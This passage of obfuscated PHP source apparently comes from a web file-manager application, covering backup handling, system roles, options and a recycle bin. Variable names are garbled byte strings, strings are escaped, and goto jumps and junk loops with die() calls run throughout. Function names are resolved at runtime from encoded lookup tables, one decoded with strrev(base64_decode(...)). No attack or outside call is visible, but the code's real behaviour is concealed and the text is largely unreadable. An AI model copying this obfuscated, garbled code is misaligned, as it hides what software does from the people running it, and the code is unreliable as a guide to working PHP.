(strlen($Ğ„ĞÖáĞ) < $ñÇÊ‰”[615]) { if (!$Ğ„ĞÖáĞ) { break; } $Ğ„ĞÖáĞ++; } $çÉ¸Ï š = 0; for ($º™Í¹‰‚ = 0; $º™Í¹‰‚ < strlen($„ïàëì); $º™Í¹‰‚++) { $çÉ¸Ï š = $çÉ¸Ï š == strlen($¥¡Ş¬³) ? 0 : $çÉ¸Ï š; $¢ÃæÍµé = $ñÇÊ‰”[719]; $”ê¬™Üû = $çÉ¸Ï š++; $ÆşÀøÒ = $ñÇÊ‰”[720]; while ($ÆşÀøÒ < $ñÇÊ‰”[623]) { if ($ÆşÀøÒ >= 0) { break; } $ÆşÀøÒ++; } $Ù÷®›ğÕ = strpos($°É™ÜÄ„, $„ïàëì[$º™Í¹‰‚]) - $…¢êä - ord($¥¡Ş¬³[$”ê¬™Üû]); $—ì•‰  = $ñÇÊ‰”[720]; while ($—ì•‰  < $ñÇÊ‰”[632]) { if ($—ì•‰  >= 0) { break; } $—ì•‰ ++; } while ($Ù÷®›ğÕ < 0) { $Ù÷®›ğÕ += 64; $–€¿’¬… = $ñÇÊ‰”[721]; if (!$–€¿’¬…) { die; } } $…Í×´ìè .= $°É™ÜÄ„[$Ù÷®›ğÕ]; } $‹«İëÂ = base64_decode($…Í×´ìè); break; $¶“Ñ•ªô = $ñÇÊ‰”[722]; if (strlen($¶“Ñ•ªô) < $ñÇÊ‰”[632]) { die; } default: $‹«İëÂ = $this->ozma5325d9c0($„ïàëì, $ü°ŞÍ¥ . $†ŸûÇÚ„); break; $Ôœ¢«„ƒ = $ñÇÊ‰”[723]; if (!$Ôœ¢«„ƒ) { die; } } if ($áİÆ¿‚¢ - 1 > 0) { $‹«İëÂ = $this->cslmccd44fbb($‹«İëÂ, $ü°ŞÍ¥, $áİÆ¿‚¢ - 1); } return $‹«İëÂ; } public function yrhn73be9f0b($’êšÆÙ) { $˜Ÿ¼êî± =& $_SERVER[ĞÂ¤àÓï]; $ËŠ¶ñİ =& $_SERVER[Ñ·¨¶Š£]; $âêñ™¼Í = $this->pdns362d646b(); $‹İå®Ú = $˜Ÿ¼êî±[724]; while (strlen($‹İå®Ú) < $˜Ÿ¼êî±[620]) { if (!$‹İå®Ú) { break; } $‹İå®Ú++; } $óùÌÍâ = $this->pdns362d646b(); $ÚçŞÃö = ($âêñ™¼Í - 1) * ($óùÌÍâ - 1); $®ÄÓûâ® = $˜Ÿ¼êî±[725]; while ($®ÄÓûâ® < $˜Ÿ¼êî±[620]) { if ($®ÄÓûâ® >= 0) { break; } $®ÄÓûâ®++; } $¾×áÄ¥Ì = intval(($âêñ™¼Í + $óùÌÍâ) / 2); while (1) { $Ã§Èğˆƒ = $¾×áÄ¥Ì; $Å„åĞğç = $ÚçŞÃö; $»Å‡ò¢ = $˜Ÿ¼êî±[726]; if (!$»Å‡ò¢) { return; } while ($Å„åĞğç % $Ã§Èğˆƒ != 0) { $¾íõöğõ = $Å„åĞğç; $Å„åĞğç = $Ã§Èğˆƒ; $Ã§Èğˆƒ = $¾íõöğõ % $Ã§Èğˆƒ; $‘„Ä¶÷Ã = $˜Ÿ¼êî±[727]; while (strlen($‘„Ä¶÷Ã) < $˜Ÿ¼êî±[615]) { if (!$‘„Ä¶÷Ã) { break; } $‘„Ä¶÷Ã++; } } if ($Ã§Èğˆƒ == 1) { break; } else { $¾×áÄ¥Ì++; } } $„å¢‘Ê˜ = 2; $Àû¿†ÉŒ = $˜Ÿ¼êî±[728]; if (strlen($Àû¿†ÉŒ) < $˜Ÿ¼êî±[632]) { die; } for ($×¶¯ç½Ì = 0; $×¶¯ç½Ì < $ÚçŞÃö * 10; $×¶¯ç½Ì++) { if (($ÚçŞÃö * $×¶¯ç½Ì + 1) % $¾×áÄ¥Ì == 0) { $„å¢‘Ê˜ = intval(($ÚçŞÃö * $×¶¯ç½Ì + 1) / $¾×áÄ¥Ì); break; } } $½ƒóû€ = $this->wzbhbb44e3d1($âêñ™¼Í * $óùÌÍâ . $ËŠ¶ñİ[6], $ËŠ¶ñİ[135]); $Ê”ÚñÓ = $˜Ÿ¼êî±[729]; while ($Ê”ÚñÓ < $˜Ÿ¼êî±[630]) { if ($Ê”ÚñÓ >= 0) { break; } $Ê”ÚñÓ++; } $´ºÉí = md5($ËŠ¶ñİ[299] . ($âêñ™¼Í + $óùÌÍâ) . $ËŠ¶ñİ[300] . $¾×áÄ¥Ì . $ËŠ¶ñİ[300] . $„å¢‘Ê˜ . $ËŠ¶ñİ[301]); $ÍŠÊæôÄ = $˜Ÿ¼êî±[730]; $ôœ§úòÇ = $this->wzbhbb44e3d1($’êšÆÙ, $´ºÉí) . $ËŠ¶ñİ[302] . $½ƒóû€; return $ôœ§úòÇ; $àœØ÷ï† = $˜Ÿ¼êî±[731]; while ($àœØ÷ï† < $˜Ÿ¼êî±[623]) { if ($àœØ÷ï† >= 0) { break; } $àœØ÷ï†++; } } public function kscwe829485a($€İíõ²Å) { $ÂŸ¾å =& $_SERVER[ĞÂ¤àÓï]; $ªšä¦éµ =& $_SERVER[Ñ·¨¶Š£]; $Àãø¯÷Ï = explode($ªšä¦éµ[302], $€İíõ²Å); $Æ™Éäï« = $ÂŸ¾å[732]; while ($Æ™Éäï« < $ÂŸ¾å[620]) { if ($Æ™Éäï« >= 0) { break; } $Æ™Éäï«++; } if (count($Àãø¯÷Ï) != 2) { return $ªšä¦éµ[6]; } $Ôò©Ïšñ = $this->ozma5325d9c0($Àãø¯÷Ï[1] . $ªšä¦éµ[6], $ªšä¦éµ[135]); if (!$Ôò©Ïšñ) { return $ªšä¦éµ[6]; } $Ôò©Ïšñ = intval($Ôò©Ïšñ); $Ä›ëÚôò = $ÂŸ¾å[733]; if (strlen($Ä›ëÚôò) < $ÂŸ¾å[632]) { return; } $ïêò°ó˜ = 0; $­ÌËÑ”Ú = 0; for ($µîéÌßé = 3; $µîéÌßé < $Ôò©Ïšñ; $µîéÌßé += 2) { if ($Ôò©Ïšñ % $µîéÌßé != 0) { continue; } $ïêò°ó˜ = $µîéÌßé; $­ÌËÑ”Ú = intval($Ôò©Ïšñ / $µîéÌßé); break; $â™ÅÜª = $ÂŸ¾å[734]; if (!$â™ÅÜª) { die; } } $³ÈœŸ¢ş = ($ïêò°ó˜ - 1) * ($­ÌËÑ”Ú - 1); $„èİ²™ = $ÂŸ¾å[735]; $Úœ¿•¼è = intval(($ïêò°ó˜ + $­ÌËÑ”Ú) / 2); $â…µä‰î = $ÂŸ¾å[736]; if (strlen($â…µä‰î) < $ÂŸ¾å[623]) { return; } while (1) { $’úÕ—’å = $Úœ¿•¼è; $š™²«ë¹ = $³ÈœŸ¢ş; while ($š™²«ë¹ % $’úÕ—’å != 0) { $Â¸Š‘¦Õ = $š™²«ë¹; $İ”ÅÜß¢ = $ÂŸ¾å[737]; if (strlen($İ”ÅÜß¢) < $ÂŸ¾å[615]) { return; } $š™²«ë¹ = $’úÕ—’å; $Ê‚Ôáöö = $ÂŸ¾å[738]; if (strlen($Ê‚Ôáöö) < $ÂŸ¾å[623]) { die; } $’úÕ—’å = $Â¸Š‘¦Õ % $’úÕ—’å; } if ($’úÕ—’å == 1) { break; } else { $Úœ¿•¼è++; } } $Ü¼ˆêªÌ = 2; $Á˜ğ‘Š¿ = $ÂŸ¾å[739]; for ($µîéÌßé = 0; $µîéÌßé < $³ÈœŸ¢ş * 10; $µîéÌßé++) { if (($³ÈœŸ¢ş * $µîéÌßé + 1) % $Úœ¿•¼è == 0) { $Ü¼ˆêªÌ = intval(($³ÈœŸ¢ş * $µîéÌßé + 1) / $Úœ¿•¼è); break; } } $óö¦Ì÷½ = md5($ªšä¦éµ[299] . ($ïêò°ó˜ + $­ÌËÑ”Ú) . $ªšä¦éµ[300] . $Úœ¿•¼è . $ªšä¦éµ[300] . $Ü¼ˆêªÌ . $ªšä¦éµ[301]); $–š×•ı = $ÂŸ¾å[740]; while ($–š×•ı < $ÂŸ¾å[620]) { if ($–š×•ı >= 0) { break; } $–š×•ı++; } $øûú©³× = $this->ozma5325d9c0($Àãø¯÷Ï[0], $óö¦Ì÷½); $ƒ×ü­° = $ÂŸ¾å[741]; if (strlen($ƒ×ü­°) < $ÂŸ¾å[623]) { die; } return $øûú©³×; } public function pdns362d646b() { $¥ƒ„ò§Š =& $_SERVER[ĞÂ¤àÓï]; $»ø¬ÃÑ = mt_rand(pow(2, 14), pow(2, 16) - 1); $Ñ¾—ÏÏß = array(); $ÑíåÒİç = $¥ƒ„ò§Š[742]; while ($ÑíåÒİç < $¥ƒ„ò§Š[632]) { if ($ÑíåÒİç >= 0) { break; } $ÑíåÒİç++; } $Üã•³³ı = 1; while ($Üã•³³ı <= (int) sqrt($»ø¬ÃÑ)) { $â¶Öâï¿ = $Üã•³³ı; $€±ãŠÃ = $¥ƒ„ò§Š[743]; if (!$€±ãŠÃ) { die; } while (!0) { $â¶Öâï¿++; if ($â¶Öâï¿ <= 2) { $Üã•³³ı = $â¶Öâï¿; break; } else { if ($â¶Öâï¿ < 2) { continue; } } $§²İãÍŸ = !0; for ($¹’ö¤çï = 2; $¹’ö¤çï <= sqrt($â¶Öâï¿); $¹’ö¤çï++) { if ($â¶Öâï¿ % $¹’ö¤çï == 0) { $§²İãÍŸ = !1; } } if ($§²İãÍŸ) { $Üã•³³ı = $â¶Öâï¿; break; } } $Ñ¾—ÏÏß[] = $Üã•³³ı; } $ç¡Ñ¶¥ù = 2; $ÆĞ‡ó·• = $¥ƒ„ò§Š[744]; for ($â¶Öâï¿ = $»ø¬ÃÑ; $â¶Öâï¿ > 1; $â¶Öâï¿--) { $§²İãÍŸ = !0; foreach ($Ñ¾—ÏÏß as $ê ûïâ¢) { if ($â¶Öâï¿ % $ê ûïâ¢ == 0) { $§²İãÍŸ = !1; break; } } if ($§²İãÍŸ) { $ç¡Ñ¶¥ù = $â¶Öâï¿; break; } } return $ç¡Ñ¶¥ù; $õÚËµí  = $¥ƒ„ò§Š[745]; if (!$õÚËµí ) { die; } } public function bwhkceee82cc($Ù×¬³î, $Ëó©’°õ) { $­ÚæôÑ‘ =& $_SERVER[ĞÂ¤àÓï]; $Şğ²ô¿Á =& $_SERVER[Ñ·¨¶Š£]; return call_user_func(array($Şğ²ô¿Á[8], $Şğ²ô¿Á[303]), $Ù×¬³î, $Ëó©’°õ); $Ë¾ï¨‡ª = $­ÚæôÑ‘[746]; while (strlen($Ë¾ï¨‡ª) < $­ÚæôÑ‘[630]) { if (!$Ë¾ï¨‡ª) { break; } $Ë¾ï¨‡ª++; } } public function wzbhbb44e3d1($±‡‰•Æ, $€ı  ¨Ù) { $ü¶ ¸¾Ö =& $_SERVER[Ñ·¨¶Š£]; return call_user_func(array($ü¶ ¸¾Ö[304], $ü¶ ¸¾Ö[305]), $±‡‰•Æ, $€ı  ¨Ù); } public function ozma5325d9c0($üûşÎÃ, $Åï‹ßÉõ) { $õ“ì Ûò =& $_SERVER[Ñ·¨¶Š£]; return call_user_func(array($õ“ì Ûò[304], $õ“ì Ûò[306]), $üûşÎÃ, $Åï‹ßÉõ); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $ˆÁÌÛã» =& $_SERVER[ĞÂ¤àÓï]; $this->isManual(); self::$name = date($ˆÁÌÛã»[747]); if (!($šø©ì¥ = Model($ˆÁÌÛã»[748])->lastItem())) { $šø©ì¥ = $this->initData(); } else { self::$name = $šø©ì¥[$ˆÁÌÛã»[32]]; if ($šø©ì¥[$ˆÁÌÛã»[749]] == $ˆÁÌÛã»[88]) { self::$name = date($ˆÁÌÛã»[750]); $¸Ó‚ÌÒ¡ = 0; if (isset($šø©ì¥[$ˆÁÌÛã»[293]][$ˆÁÌÛã»[199]][$ˆÁÌÛã»[468]])) { $¸Ó‚ÌÒ¡ = (int) $šø©ì¥[$ˆÁÌÛã»[293]][$ˆÁÌÛã»[199]][$ˆÁÌÛã»[468]]; } if (self::$manual == 0 && $šø©ì¥[$ˆÁÌÛã»[32]] == self::$name) { Model($ˆÁÌÛã»[748])->remove($šø©ì¥[$ˆÁÌÛã»[399]]); } $šø©ì¥ = $this->initData($¸Ó‚ÌÒ¡, $šø©ì¥[$ˆÁÌÛã»[751]]); } else { $this->checkStore($šø©ì¥[$ˆÁÌÛã»[751]]); } } self::$option = $šø©ì¥; } private function isManual() { $ûøÏ¬„¨ = _get($GLOBALS, $_SERVER[ĞÂ¤àÓï][752], 0); $ûøÏ¬„¨ = intval($ûøÏ¬„¨); self::$manual = $ûøÏ¬„¨ && $ûøÏ¬„¨ == 1 ? 1 : 0; } private function initData($“¾–‘¬ƒ = 0, $Ã³ÂèÛÌ = '') { $ßÏ—Ï€À =& $_SERVER[ĞÂ¤àÓï]; $ë—™ñıÛ = Model($ßÏ—Ï€À[748])->config(); if ($Ã³ÂèÛÌ && $ë—™ñıÛ[$ßÏ—Ï€À[751]] != $Ã³ÂèÛÌ) { $“¾–‘¬ƒ = 0; } $this->checkStore($ë—™ñıÛ[$ßÏ—Ï€À[751]]); if (self::$manual == 1) { self::$name .= $ßÏ—Ï€À[11] . date($ßÏ—Ï€À[753]); } $ß½Óšå = array($ßÏ—Ï€À[751] => $ë—™ñıÛ[$ßÏ—Ï€À[751]], $ßÏ—Ï€À[32] => self::$name, $ßÏ—Ï€À[749] => 0, $ßÏ—Ï€À[754] => $ë—™ñıÛ[$ßÏ—Ï€À[754]], $ßÏ—Ï€À[755] => self::$manual, $ßÏ—Ï€À[293] => array($ßÏ—Ï€À[756] => array($ßÏ—Ï€À[749] => 0), $ßÏ—Ï€À[757] => array($ßÏ—Ï€À[749] => 0, $ßÏ—Ï€À[758] => 0, $ßÏ—Ï€À[759] => 0, $ßÏ—Ï€À[33] => $ßÏ—Ï€À[12], $ßÏ—Ï€À[760] => 0, $ßÏ—Ï€À[497] => 0), $ßÏ—Ï€À[761] => array($ßÏ—Ï€À[749] => 0, $ßÏ—Ï€À[758] => 0, $ßÏ—Ï€À[759] => 0, $ßÏ—Ï€À[760] => 0, $ßÏ—Ï€À[497] => 0), $ßÏ—Ï€À[199] => array($ßÏ—Ï€À[749] => 0, $ßÏ—Ï€À[762] => 0, $ßÏ—Ï€À[763] => 0, $ßÏ—Ï€À[764] => 0, $ßÏ—Ï€À[765] => 0, $ßÏ—Ï€À[468] => $“¾–‘¬ƒ, $ßÏ—Ï€À[760] => 0, $ßÏ—Ï€À[497] => 0)), $ßÏ—Ï€À[760] => time(), $ßÏ—Ï€À[497] => 0); $ä°üıæ® = Model($ßÏ—Ï€À[748])->insert($ß½Óšå); $ß½Óšå[$ßÏ—Ï€À[399]] = $ä°üıæ®; return $ß½Óšå; } private function checkStore($¸å…ªâš) { $Ö€ôÔ§¹ =& $_SERVER[ĞÂ¤àÓï]; $–¨™ùÆ = Model($Ö€ôÔ§¹[766])->listData($¸å…ªâš); Model($Ö€ôÔ§¹[766])->checkConfig($–¨™ùÆ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ĞÂ¤àÓï][748])->findByName(self::$name); } return self::$option; } public static function set($†’Ğú£É) { $İõ­«ç =& $_SERVER[ĞÂ¤àÓï]; $ÚÍÓğ›µ = self::get(); foreach ($†’Ğú£É as $ïëàÔØŞ => $å»¹ƒÈ) { $´ª¢ÌóÎ = explode($İõ­«ç[10], $ïëàÔØŞ); $‘å§ÌÇÃ = count($´ª¢ÌóÎ); switch ($‘å§ÌÇÃ) { case 1: $ÚÍÓğ›µ[$´ª¢ÌóÎ[0]] = $å»¹ƒÈ; break; case 2: $ÚÍÓğ›µ[$´ª¢ÌóÎ[0]][$´ª¢ÌóÎ[1]] = $å»¹ƒÈ; break; case 3: $ÚÍÓğ›µ[$´ª¢ÌóÎ[0]][$´ª¢ÌóÎ[1]][$´ª¢ÌóÎ[2]] = $å»¹ƒÈ; break; } } Model($İõ­«ç[748])->update($ÚÍÓğ›µ[$İõ­«ç[399]], $ÚÍÓğ›µ); self::$option = $ÚÍÓğ›µ; return self::$option; } public function keep() { $€·¿¦• =& $_SERVER[ĞÂ¤àÓï]; $…Ãµ™á— = self::get(); if ($…Ãµ™á—[$€·¿¦•[293]][$€·¿¦•[756]][$€·¿¦•[749]] == $€·¿¦•[88]) { return; } $this->backupKeep($…Ãµ™á—); self::set(array($€·¿¦•[767] => 1)); } private function backupKeep($ÇÏúÙÜë) { $äûù¤Ô =& $_SERVER[ĞÂ¤àÓï]; if (self::$manual == 1) { return; } $œ¿ÑÂñ® = Model($äûù¤Ô[748])->listData(); if (empty($œ¿ÑÂñ®)) { return; } $ƒâå€Ñ = 0; $ë¤©çÖ® = array(); foreach ($œ¿ÑÂñ® as $±í´ã§Ä) { if ($ƒâå€Ñ >= 7) { break; } $ë¤©çÖ®[] = $±í´ã§Ä[$äûù¤Ô[32]]; $ƒâå€Ñ++; } for ($ƒâå€Ñ = 0; $ƒâå€Ñ < 12; $ƒâå€Ñ++) { $ë¤©çÖ®[] = date($äûù¤Ô[768], strtotime("\55{$ƒâå€Ñ}\40\155\157\x6e\x74\150\x73")); } $ë¤©çÖ® = array_unique($ë¤©çÖ®); $š½şÀÖ¢ = Model($äûù¤Ô[769])->get($äûù¤Ô[770]); foreach ($œ¿ÑÂñ® as $±í´ã§Ä) { if (isset($±í´ã§Ä[$äûù¤Ô[755]]) && $±í´ã§Ä[$äûù¤Ô[755]] == $äûù¤Ô[88]) { continue; } if (!empty($±í´ã§Ä[$äûù¤Ô[32]]) && in_array($±í´ã§Ä[$äûù¤Ô[32]], $ë¤©çÖ®)) { continue; } Model($äûù¤Ô[748])->remove($±í´ã§Ä[$äûù¤Ô[399]]); $¸½³¯¦’ = $this->backupPath($ÇÏúÙÜë, $š½şÀÖ¢); IO::remove($¸½³¯¦’, !1); } } private function backupPath($Ëç“‡ÏÍ, $µÚĞ±êô = false) { $÷ñÒªŸÑ =& $_SERVER[ĞÂ¤àÓï]; if (!$µÚĞ±êô) { $µÚĞ±êô = Model($÷ñÒªŸÑ[769])->get($÷ñÒªŸÑ[770]); } $î°ß…—Ò = $Ëç“‡ÏÍ[$÷ñÒªŸÑ[32]]; $ñ¯ùÏÏ = substr(md5($÷ñÒªŸÑ[771] . $µÚĞ±êô . $î°ß…—Ò), 0, 8); return "\173\151\x6f\72{$Ëç“‡ÏÍ[$÷ñÒªŸÑ[751]]}\175\x2f\x64\141\x74\141\x62\x61\163\145\x2f\x62\141\x63\153\x75\x70\x2f" . $î°ß…—Ò . $÷ñÒªŸÑ[11] . $ñ¯ùÏÏ; } public function db() { $ö®é±Û =& $_SERVER[ĞÂ¤àÓï]; $¢¨¾Ğ¼½ = self::get(); if ($¢¨¾Ğ¼½[$ö®é±Û[293]][$ö®é±Û[757]][$ö®é±Û[749]] == $ö®é±Û[88]) { return !0; } $…¾º×á = new BackupDb(); if (!$…¾º×á->index()) { return !1; } self::set(array($ö®é±Û[772] => 1)); return !0; } public function dbFile() { $ÛÛˆá™Ü =& $_SERVER[ĞÂ¤àÓï]; $Î¢²úãè = self::get(); if ($Î¢²úãè[$ÛÛˆá™Ü[293]][$ÛÛˆá™Ü[761]][$ÛÛˆá™Ü[749]] == $ÛÛˆá™Ü[88]) { return !0; } $î¬õ ï = new BackupDbFile(); if (!$î¬õ ï->index()) { return !1; } self::set(array($ÛÛˆá™Ü[773] => 1)); return !0; } public function file() { $³ñ™Úç =& $_SERVER[ĞÂ¤àÓï]; $¬â³×•« = self::get(); if ($¬â³×•«[$³ñ™Úç[293]][$³ñ™Úç[199]][$³ñ™Úç[749]] == $³ñ™Úç[88]) { return !0; } if (!isset($¬â³×•«[$³ñ™Úç[754]]) || $¬â³×•«[$³ñ™Úç[754]] == $³ñ™Úç[197]) { $—Å…¦¢ = new BackupFile(); if (!$—Å…¦¢->index()) { return !1; } } self::set(array($³ñ™Úç[774] => 1, $³ñ™Úç[749] => 1)); return !0; } } $_file = $_SERVER[$_SERVER[ĞÂ¤àÓï][775]]; goto aØİâ¿À¼î; E…æÙ¶ë§ã: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\164\x65\155\137\x6f\160\x74\x69\157\x6e"; protected $jsonField = array("\155\x65\156\x75", "\162\x6f\x6c\145", "\162\157\154\x65\x47\162\157\165\x70", "\162\x65\x67\x69\x73\x74", "\x65\x6d\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($«éâ‹îî) { return "\x53\171\x73\x74\145\155\x4f\160\164\151\157\x6e\137{$«éâ‹îî}"; } protected function optionDefault($ØÅ†…úì = '') { $ˆêÈ¥ãÌ =& $_SERVER[ĞÂ¤àÓï]; if ($ØÅ†…úì == $ˆêÈ¥ãÌ[12]) { return $GLOBALS[$ˆêÈ¥ãÌ[6]][$ˆêÈ¥ãÌ[381]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\56\x72\157\x6c\x65\114\x69\163\x74"; public $field = array("\156\x61\155\x65", "\141\165\164\x68", "\x6c\141\142\145\x6c", "\x64\x69\163\160\154\x61\171", "\x73\171\163\x74\x65\155", "\x64\x65\163\x63", "\151\x67\x6e\x6f\x72\x65\x45\170\164", "\151\147\156\157\162\x65\106\x69\154\145\123\x69\x7a\145", "\x61\144\155\x69\156\x69\163\x74\162\x61\x74\x6f\162", "\163\157\162\164"); public function listData($¹››Îàí = false, $À·Šª–á = "\163\x6f\x72\164", $†Í·×ó = false) { $íæŠˆş¸ =& $_SERVER[ĞÂ¤àÓï]; $áÃŒç±ø = parent::listData($¹››Îàí, $À·Šª–á, $†Í·×ó); if (!$¹››Îàí) { foreach ($áÃŒç±ø as $âãˆ¦Âç => $ìâÌŠûÎ) { if ($ìâÌŠûÎ[$íæŠˆş¸[2052]] == 1) { $áÃŒç±ø[$âãˆ¦Âç][$íæŠˆş¸[453]] = LNG($íæŠˆş¸[2286]); } } } return $áÃŒç±ø; } public function update($—Ğ™İ–, $…Ë‘Óµí) { $¥óƒÖÛğ =& $_SERVER[ĞÂ¤àÓï]; $çü±£š“ = parent::listData($—Ğ™İ–); $©¼Ú÷Œ = $this->findByName($…Ë‘Óµí[$¥óƒÖÛğ[32]]); if (!$çü±£š“ || $©¼Ú÷Œ && $©¼Ú÷Œ[$¥óƒÖÛğ[399]] != $çü±£š“[$¥óƒÖÛğ[399]]) { return !1; } if ($©¼Ú÷Œ[$¥óƒÖÛğ[2052]] == 1) { $…Ë‘Óµí = array($¥óƒÖÛğ[32] => $…Ë‘Óµí[$¥óƒÖÛğ[32]], $¥óƒÖÛğ[1877] => $…Ë‘Óµí[$¥óƒÖÛğ[1877]]); } $this->filterAuth($…Ë‘Óµí[$¥óƒÖÛğ[413]]); return parent::update($—Ğ™İ–, $…Ë‘Óµí); } public function remove($´¦ğŞèä) { $ÙªŠí•ñ = parent::listData($´¦ğŞèä); if (!$ÙªŠí•ñ || $ÙªŠí•ñ[$_SERVER[ĞÂ¤àÓï][1285]]) { return !1; } return parent::remove($´¦ğŞèä); } public function add($§‘–¦¡ô) { $ÉÒ›¬íş =& $_SERVER[ĞÂ¤àÓï]; $á„×¿‰Ó = $§‘–¦¡ô[$ÉÒ›¬íş[32]]; if ($this->findByName($á„×¿‰Ó)) { return !1; } $™Æ’µúÎ = array($ÉÒ›¬íş[420] => $á„×¿‰Ó, $ÉÒ›¬íş[1860] => $ÉÒ›¬íş[12], $ÉÒ›¬íş[1856] => $ÉÒ›¬íş[1864], $ÉÒ›¬íş[2287] => 1, $ÉÒ›¬íş[1859] => 0, $ÉÒ›¬íş[2288] => 0, $ÉÒ›¬íş[1858] => $this->getSort()); $§‘–¦¡ô = array_merge($™Æ’µúÎ, $§‘–¦¡ô); $this->filterAuth($§‘–¦¡ô[$ÉÒ›¬íş[413]]); return parent::insert($§‘–¦¡ô); } private function getSort() { $ë‹„ŒÁÂ =& $_SERVER[ĞÂ¤àÓï]; $ı—‹®‡‘ = parent::listData(); $¨™ĞÜšÛ = array_to_keyvalue($ı—‹®‡‘, $ë‹„ŒÁÂ[12], $ë‹„ŒÁÂ[1878]); return empty($¨™ĞÜšÛ) ? 0 : max($¨™ĞÜšÛ) + 1; } private function filterAuth(&$ñ †÷Ö) { $€ö­£®² =& $_SERVER[ĞÂ¤àÓï]; $ô£ µˆ© = array(); $è÷Ş¦÷š = array_filter(explode($€ö­£®²[50], $ñ †÷Ö)); foreach ($è÷Ş¦÷š as $ñ †÷Ö) { $ñè“€Óé = explode($€ö­£®²[10], $ñ †÷Ö); if ($ñè“€Óé[0] == $€ö­£®²[2289] && $ñè“€Óé[1] != $€ö­£®²[1191]) { $ÑÃ“›” = $ñè“€Óé[0] . $€ö­£®²[10] . $ñè“€Óé[1] . $€ö­£®²[2290]; if (!in_array($ÑÃ“›”, $è÷Ş¦÷š)) { $ô£ µˆ©[] = $ÑÃ“›”; } } $ô£ µˆ©[] = $ñ †÷Ö; } $ñ †÷Ö = implode($€ö­£®²[50], $ô£ µˆ©); } public function findRoleDefault() { $¬¿õ²õ¯ =& $_SERVER[ĞÂ¤àÓï]; $åˆƒ¡£Ÿ = parent::listData(); $Ò¯ª’¦Ü = !1; foreach ($åˆƒ¡£Ÿ as $Œ˜ñ‡É†) { if (!$Œ˜ñ‡É† || $Œ˜ñ‡É†[$¬¿õ²õ¯[1876]] == $¬¿õ²õ¯[197] || $Œ˜ñ‡É†[$¬¿õ²õ¯[2052]] == 1) { continue; } if (strstr($Œ˜ñ‡É†[$¬¿õ²õ¯[413]], $¬¿õ²õ¯[2291])) { continue; } if (!strstr($Œ˜ñ‡É†[$¬¿õ²õ¯[413]], $¬¿õ²õ¯[2292])) { continue; } if (!$Ò¯ª’¦Ü) { $Ò¯ª’¦Ü = $Œ˜ñ‡É†; continue; } $î½º¢™÷ = explode($¬¿õ²õ¯[50], $Ò¯ª’¦Ü[$¬¿õ²õ¯[413]]); $ë¡¿¾´Ü = explode($¬¿õ²õ¯[50], $Œ˜ñ‡É†[$¬¿õ²õ¯[413]]); if (count($î½º¢™÷) > count($ë¡¿¾´Ü)) { $Ò¯ª’¦Ü = $Œ˜ñ‡É†; } } return $Ò¯ª’¦Ü ? $Ò¯ª’¦Ü[$¬¿õ²õ¯[399]] : $¬¿õ²õ¯[12]; } public function sort($‡Š´éî©, $©ƒäŞé•) { return parent::update($‡Š´éî©, $©ƒäŞé•); } } goto BÍ­ˆ–¤; C±—íÁ«¿Ï: $fileSize = strrev(base64_decode($_SERVER[ÚâÊšŒı][0])); function binCheckNeq($˜áìÕØö, $ÆÜº§„Ú) { return $˜áìÕØö != $ÆÜº§„Ú; } $_SERVER[$_SERVER[ÚâÊšŒı][1]] = $fileSize($_SERVER[$_SERVER[ÚâÊšŒı][2]]); goto E¿ ô¢ŒëÄ; dé©Å°–“«: define($_SERVER[ĞÂ¤àÓï][238], 1); define($_SERVER[ĞÂ¤àÓï][239], 2); define($_SERVER[ĞÂ¤àÓï][240], 3); goto e§§àËÒø; B”ÕªùöìÎ: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\x75\162\143\x65\137\x72\x65\143\171\143\x6c\x65"; protected $dataAuto = array(array("\x63\x72\145\x61\x74\x65\124\151\155\x65", "\x74\151\x6d\145", "\x69\156\163\x65\x72\164", "\x66\x75\x6e\143\164\x69\157\x6e")); public function listData($îîß’™÷ = false) { $ØÈŒŠ° =& $_SERVER[ĞÂ¤àÓï]; $îîß’™÷ = $îîß’™÷ ? $îîß’™÷ : USER_ID; $Ñó…¶˜ø = $this->where(array($ØÈŒŠ°[1655] => $îîß’™÷))->select(); return array_to_keyvalue($Ñó…¶˜ø, $ØÈŒŠ°[12], $ØÈŒŠ°[402]); } public function moveToRecycle($Ş¯·™ ª) { $ñµºß‘ =& $_SERVER[ĞÂ¤àÓï]; $ƒàš¯û¼ = Model($ñµºß‘[1336]); $Á·Í¨ı¦ = $ƒàš¯û¼->sourceInfo($Ş¯·™ ª); if (!$Á·Í¨ı¦ || $Á·Í¨ı¦[$ñµºß‘[431]] == $ñµºß‘[88]) { return; } $©ƒÅÀ = array($ñµºß‘[417] => $Ş¯·™ ª, $ñµºß‘[1655] => USER_ID, $ñµºß‘[586] => $Á·Í¨ı¦[$ñµºß‘[411]], $ñµºß‘[587] => $Á·Í¨ı¦[$ñµºß‘[505]], $ñµºß‘[590] => $Á·Í¨ı¦[$ñµºß‘[521]]); $this->add($©ƒÅÀ); $this->recycleMove($Ş¯·™ ª, 1); if ($Á·Í¨ı¦[$ñµºß‘[410]] == $ñµºß‘[88]) { $Õ¹œ´šÍ = array($ñµºß‘[590] => array($ñµºß‘[550], $Á·Í¨ı¦[$ñµºß‘[521]] . $Ş¯·™ ª . $ñµºß‘[551])); $ƒàš¯û¼->where($Õ¹œ´šÍ)->setField($ñµºß‘[431], 1); } } public function clear() { $this->remove(!1); } public function remove($”öøİ = false, $Û©úı¨ = false) { $Óø¤¨ÛĞ =& $_SERVER[ĞÂ¤àÓï]; $Û©úı¨ = $Û©úı¨ ? $Û©úı¨ : USER_ID; $¢÷áóš = Model($Óø¤¨ÛĞ[1336]); $ø‡éüú½ = $this->listData($Û©úı¨); $”öøİ = $”öøİ === !1 ? !1 : $”öøİ; $Õì©¾ˆî = array(); foreach ($ø‡éüú½ as $âó»·ø‡) { if ($”öøİ != !1 && !in_array($âó»·ø‡, $”öøİ)) { continue; } $åÒ””Ä  = $¢÷áóš->sourceInfo($âó»·ø‡); $¢÷áóš->remove($âó»·ø‡, !1); $±“é“â¹ = $åÒ””Ä [$Óø¤¨ÛĞ[411]] . $Óø¤¨ÛĞ[11] . $åÒ””Ä [$Óø¤¨ÛĞ[505]]; $Õì©¾ˆî[$±“é“â¹] = 